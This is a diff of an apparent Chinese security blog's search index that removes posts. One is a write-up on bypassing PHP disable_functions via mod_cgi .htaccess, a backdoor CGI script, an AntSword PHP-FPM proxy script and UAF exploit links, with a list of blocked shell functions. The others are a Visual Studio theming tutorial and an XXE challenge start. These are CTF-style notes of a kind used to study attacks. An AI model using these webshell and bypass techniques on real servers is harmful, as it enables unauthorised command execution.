-<p>1.Mod CGI 就是把 PHP 做为 APACHE 一个内置模块，让 apache http 服务器本身能够支持 PHP 语言，不需要每一个请求都通过启动 PHP 解释器来解释 PHP. 2.它可以将 cgi-script 文件或者用户自定义标识头为 cgi-script 的文件通过服务器运行. 3.在.htaccess 文件中可定制用户定义标识头 4.添加 Options +ExecCGI，代表着允许使用 mod_cgi 模块执行 CGI 脚本 5.添加 AddHandler cgi-script .cgi，代表着包含.cgi 扩展名的文件都将被视为 CGI 程序</p>
-</blockquote>
-<p>条件</p>
-<ol>
-<li>必须是 apache 环境</li>
-<li>mod_cgi 已经启用</li>
-<li>必须允许.htaccess 文件，也就是说在 httpd.conf 中，要注意 AllowOverride 选项为 All，而不是 none</li>
-<li>必须有权限写.htaccess 文件</li>
-</ol>
-<h3 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h3><p>.htaccess</p>
-<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">Options +ExecCGI AddHandler cgi-script .cgi</span></span><br></pre></td></tr></table></figure>
-
-<p>shell.cgi</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">echo&amp;&amp;cd &quot;/var/www/html/backdoor&quot;;cat shell.cgi;echo 96642;pwd;echo c26b314f4b</span><br></pre></td></tr></table></figure>
-
-<h3 id="简单方法："><a href="#简单方法：" class="headerlink" title="简单方法："></a>简单方法：</h3><p>蚁剑连<br>还是那个插件 bypass！<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254016967-19.png" alt="在这里插入图片描述"></p>
-<h2 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h2><ol>
-<li>FPM 是 fast-cgi 的协议解析器</li>
-<li>webserver 使用 cgi 协议封装好用户的请求发送给 FPM</li>
-<li>FPM 按照 cgi 的协议将 TCP 流解析成真正的数据</li>
-</ol>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254019084-22.png" alt="在这里插入图片描述"><br>蚁剑 bypass<br>模式：FPM<br>地址：127.0.0.1：9000 或 localhost：9000<br>植入后修改 shell 地址为 http:&#x2F;&#x2F;……&#x2F;.antproxy.php</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_client_header</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$headers</span>=<span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_SERVER</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$k</span>,<span class="string">&#x27;HTTP_&#x27;</span>)===<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$k</span>=<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/^HTTP/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$k</span>));</span><br><span class="line">            <span class="variable">$k</span>=<span class="title function_ invoke__">preg_replace_callback</span>(<span class="string">&#x27;/_\w/&#x27;</span>,<span class="string">&#x27;header_callback&#x27;</span>,<span class="variable">$k</span>);</span><br><span class="line">            <span class="variable">$k</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/^_/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$k</span>);</span><br><span class="line">            <span class="variable">$k</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="variable">$k</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$k</span>==<span class="string">&#x27;Host&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="variable">$headers</span>[]=<span class="string">&quot;<span class="subst">$k</span>:<span class="subst">$v</span>&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$headers</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">header_callback</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$str</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseHeader</span>(<span class="params"><span class="variable">$sResponse</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$headerstr</span>,<span class="variable">$sResponse</span>)=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>,<span class="variable">$sResponse</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="variable">$ret</span>=<span class="keyword">array</span>(<span class="variable">$headerstr</span>,<span class="variable">$sResponse</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^HTTP/1.1 d&#123;3&#125;/&#x27;</span>, <span class="variable">$sResponse</span>))&#123;</span><br><span class="line">        <span class="variable">$ret</span>=<span class="title function_ invoke__">parseHeader</span>(<span class="variable">$sResponse</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">120</span>);</span><br><span class="line"><span class="variable">$headers</span>=<span class="title function_ invoke__">get_client_header</span>();</span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="number">61921</span>;</span><br><span class="line"><span class="variable">$errno</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$errstr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$timeout</span> = <span class="number">30</span>;</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;/index.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> .= <span class="string">&quot;?&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$timeout</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$method</span> = <span class="string">&quot;GET&quot;</span>;</span><br><span class="line"><span class="variable">$post_data</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]==<span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&quot;POST&quot;</span>;</span><br><span class="line">    <span class="variable">$post_data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$out</span> = <span class="variable">$method</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$url</span>.<span class="string">&quot; HTTP/1.1\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: &quot;</span>.<span class="variable">$host</span>.<span class="string">&quot;:&quot;</span>.<span class="variable">$port</span>.<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Content-Type: &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Content-length:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_data</span>).<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="title function_ invoke__">implode</span>(<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$headers</span>);</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;&quot;</span>.<span class="variable">$post_data</span>;</span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line"><span class="variable">$response</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>, <span class="number">4096</span>))&#123;</span><br><span class="line">    <span class="variable">$response</span> .= <span class="variable">$row</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$response</span>, <span class="string">&quot;\r\n\r\n&quot;</span>);</span><br><span class="line"><span class="variable">$response</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$response</span>, <span class="variable">$pos</span>+<span class="number">4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$response</span>;</span><br></pre></td></tr></table></figure>
-
-<h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h2><h3 id="GC"><a href="#GC" class="headerlink" title="GC"></a>GC</h3><blockquote>
-<p>利用的是 PHP Garbage Collector 程序中的堆溢出触发</p>
-</blockquote>
-<p><a href="https://bugs.php.net/bug.php?id=72530">题目附件</a><br><em>其实蚁剑的 reference 就有这附件 包括后面的大佬脚本</em><br>可以用蚁剑一把梭<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254029334-25.png" alt="在这里插入图片描述"></p>
-<p>另附<br><code>[大佬poc](https://github.com/mm0r1/exploits)</code><br>UAF 的脚本里面都有<br><code>tql！</code></p>
-<h3 id="Json-Serializer-UAF"><a href="#Json-Serializer-UAF" class="headerlink" title="Json Serializer UAF"></a>Json Serializer UAF</h3><blockquote>
-<p>漏洞利用 json 在序列化中的堆溢出触发 bypass，漏洞为 bug #77843</p>
-</blockquote>
-<p>蚁剑一把梭</p>
-<h3 id="Backtrace-UAF"><a href="#Backtrace-UAF" class="headerlink" title="Backtrace UAF"></a>Backtrace UAF</h3><blockquote>
-<p>漏洞利用的是 debug_backtrace 这个函数，可以利用该函数的漏洞返回已经销毁的变量的引用达成堆溢出，漏洞为 bug #76047</p>
-</blockquote>
-<h2 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h2><p><a href="https://www.laruence.com/2020/03/11/5475.html">PHP FFI 详解</a></p>
-<blockquote>
-<p><code>**disabled function:**</code><br>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv</p>
-</blockquote>
-<h2 id="iconv"><a href="#iconv" class="headerlink" title="iconv"></a>iconv</h2><ul>
-<li>github.com&#x2F;AntSwordProject&#x2F;AntSword-Labs&#x2F;tree&#x2F;master&#x2F;bypass_disable_functions&#x2F;9&#x2F;</li>
-<li><a href="https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80">https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80</a></li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_client_header</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$headers</span>=<span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_SERVER</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$k</span>,<span class="string">&#x27;HTTP_&#x27;</span>)===<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$k</span>=<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/^HTTP/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$k</span>));</span><br><span class="line">            <span class="variable">$k</span>=<span class="title function_ invoke__">preg_replace_callback</span>(<span class="string">&#x27;/_\w/&#x27;</span>,<span class="string">&#x27;header_callback&#x27;</span>,<span class="variable">$k</span>);</span><br><span class="line">            <span class="variable">$k</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/^_/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$k</span>);</span><br><span class="line">            <span class="variable">$k</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="variable">$k</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$k</span>==<span class="string">&#x27;Host&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="variable">$headers</span>[]=<span class="string">&quot;<span class="subst">$k</span>:<span class="subst">$v</span>&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$headers</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">header_callback</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$str</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseHeader</span>(<span class="params"><span class="variable">$sResponse</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$headerstr</span>,<span class="variable">$sResponse</span>)=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>,<span class="variable">$sResponse</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="variable">$ret</span>=<span class="keyword">array</span>(<span class="variable">$headerstr</span>,<span class="variable">$sResponse</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^HTTP/1.1 d&#123;3&#125;/&#x27;</span>, <span class="variable">$sResponse</span>))&#123;</span><br><span class="line">        <span class="variable">$ret</span>=<span class="title function_ invoke__">parseHeader</span>(<span class="variable">$sResponse</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">120</span>);</span><br><span class="line"><span class="variable">$headers</span>=<span class="title function_ invoke__">get_client_header</span>();</span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="number">63947</span>;</span><br><span class="line"><span class="variable">$errno</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$errstr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$timeout</span> = <span class="number">30</span>;</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;/index.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> .= <span class="string">&quot;?&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$timeout</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$method</span> = <span class="string">&quot;GET&quot;</span>;</span><br><span class="line"><span class="variable">$post_data</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]==<span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&quot;POST&quot;</span>;</span><br><span class="line">    <span class="variable">$post_data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$out</span> = <span class="variable">$method</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$url</span>.<span class="string">&quot; HTTP/1.1\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: &quot;</span>.<span class="variable">$host</span>.<span class="string">&quot;:&quot;</span>.<span class="variable">$port</span>.<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Content-Type: &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Content-length:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_data</span>).<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="title function_ invoke__">implode</span>(<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$headers</span>);</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;&quot;</span>.<span class="variable">$post_data</span>;</span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line"><span class="variable">$response</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>, <span class="number">4096</span>))&#123;</span><br><span class="line">    <span class="variable">$response</span> .= <span class="variable">$row</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$response</span>, <span class="string">&quot;\r\n\r\n&quot;</span>);</span><br><span class="line"><span class="variable">$response</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$response</span>, <span class="variable">$pos</span>+<span class="number">4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$response</span>;</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Visual Studio 2022界面美化教程</title>
-    <url>/2021/12/Visual%20Studio%202022%E7%95%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/</url>
-    <content><![CDATA[<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254207258-133.png" alt="点击并拖拽以移动"></p>
-<p>我之前用的是 2019 版本，后来有出新版我也没管，直到前几天他给我推送 2022 版了，查了下大部分都是好评（bug 恐惧症和恋旧），于是我决定入 2022 版了，但又怕我在 2019 调好的设置用不到 2022 上，于是暂时让两个版本共存，等 2022 调试好了再说 2019 的事。</p>
-<p>这是我在 2019 上美化用到的插件和设置（因为网上类似的不少，但 2022 版貌似没有人发过，所以我决定写这篇文章）</p>
-<p>不出所料，2022 版好多东西更新，导致一些东西不能用了，导入 2019 版甚至文件的时候，有一部分报错了，要不然就是改名了，要不然就是更新换代了，没大有影响，以萌新目前来看，是往好的方向发展了。</p>
-<p>但是我的那些美化插件直接搜名字的话是找不到了，于是我就在那找替代品，就找到了这两个插件。</p>
-<p>第一个插件，是 2019 版变的，变了样之后差点给我整不会了，它是类似于编程。</p>
-<p>新建项目 C#里面最后一项</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254210315-136.png" alt="点击并拖拽以移动"></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254212027-139.png" alt="da3a0ac9713d4b289c4351ca0ac8835d.png"></p>
-<p>创建之后，把 2019 版的该插件里的美化设置导出，然后重命名为 CustomTheme.vstheme</p>
-<p>然后复制到你新创建的 2022 版那个项目里，选择替换更新，之后项目文件夹里.sln 后缀的那个文件打开，选择你之前那个配置的名字，然后运行，不管他蹦出来啥弹窗，等他一打开接着关了就好，之后重启 visualstudio 就可以了</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254213778-142.png" alt="点击并拖拽以移动"></p>
-<p>这个插件是为后面设置背景图片准备</p>
-<p>第二个插件我原来用的是 moeIDE，但是 2022 版它不支持了，所以就用新插件代替了。</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254216001-145.png" alt="点击并拖拽以移动"></p>
-<p>背景图是 B 站 1024 节发布的一张壁纸，我用 ps 调了下对比度，让他更鲜艳一些</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254218564-148.png" alt="点击并拖拽以移动"></p>
-]]></content>
-      <categories>
-        <category>教程</category>
-      </categories>
-      <tags>
-        <tag>visual studio 2022</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SSTI模板注入</title>
     <url>/2022/10/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/12ec799b41b544eb83db7a111956c0cb.png" alt="在这里插入图片描述"></p>
@@ -398,34 +370,31 @@
       </tags>
   </entry>
   <entry>
-    <title>xxe</title>
-    <url>/2022/12/XXE/</url>
-    <content><![CDATA[<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>发现输入的 username 被 alert 了<br>查源码</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">onclick = <span class="string">&quot;XMLFunction()&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254264857-190.png" alt="在这里插入图片描述">抓包看 xml 格式<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254267429-193.png" alt="在这里插入图片描述">回来看控制台<br>发现 js 的 xml 应用</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">XMLFunction</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> xml = <span class="string">&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;root&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;username&gt;&#x27;</span> + $(<span class="string">&#x27;#username&#x27;</span>).<span class="title function_">val</span>() + <span class="string">&#x27;&lt;/username&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;password&gt;&#x27;</span> + $(<span class="string">&#x27;#password&#x27;</span>).<span class="title function_">val</span>() + <span class="string">&#x27;&lt;/password&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;/root&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">            xmlhttp.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(xmlhttp.<span class="property">readyState</span> == <span class="number">4</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">readyState</span>);</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line">                    <span class="title function_">alert</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;login.php&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">            xmlhttp.<span class="title function_">send</span>(xml);</span><br><span class="line">        &#125;;</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>构造 xxe 攻击<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254269819-196.png" alt="在这里插入图片描述">这是 post 包<code>传的时候记得把注释删去</code></p>
